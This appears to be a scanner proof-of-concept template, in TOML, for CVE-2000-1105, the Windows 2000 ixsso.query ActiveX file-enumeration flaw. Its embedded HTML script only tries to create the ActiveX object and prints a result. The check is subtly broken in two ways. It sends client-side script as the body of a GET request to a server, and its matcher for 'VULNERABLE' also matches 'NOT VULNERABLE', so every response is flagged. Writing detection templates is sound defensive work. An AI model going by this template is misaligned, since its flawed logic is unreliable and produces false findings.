[info]
author = "AVE"
description = "通过恶意网页利用 ixsso.query ActiveX 对象探测 Windows 2000 系统文件存在性，该对象被错误标记为对脚本安全"
id = "POC-AVE-2000-0798"
name = "Microsoft Windows 2000 Indexing Service ixsso.query ActiveX File Enumeration PoC"
severity = "medium"
tags = ["ave-2000-0798"]
vuln_id = [
    "CVE-2000-1105",
    "AVE-2000-0798",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = "<html><body><script>try{var q=new ActiveXObject('ixsso.query');document.write('VULNERABLE: ixsso.query ActiveX instantiated');}catch(e){document.write('NOT VULNERABLE');}</script></body></html>"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["VULNERABLE"]
